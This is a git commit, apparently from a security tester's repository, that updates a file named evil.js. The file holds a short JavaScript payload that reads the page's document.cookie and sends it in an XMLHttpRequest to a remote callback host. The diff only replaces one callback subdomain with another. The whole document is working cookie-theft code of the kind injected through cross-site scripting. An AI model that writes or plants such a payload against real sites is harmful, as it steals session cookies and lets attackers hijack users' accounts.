6f186cf76bde72caa61b8d0199d0f78d9c9e8724
SunshineFett <sunshineFett@gmail.com>
2025-11-05 05:48:32 -0500

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://dcte2cwu4oi5cgjsyw75ngbyqpwgk68v.collab.hawkislandsol.com/?' + document.cookie, true);
+xhttp.open('GET', 'https://idzsljbp8ue3rr1bmz5cnz45twznnej28.collab.hawkislandsol.com/?' + document.cookie, true);
 xhttp.send();
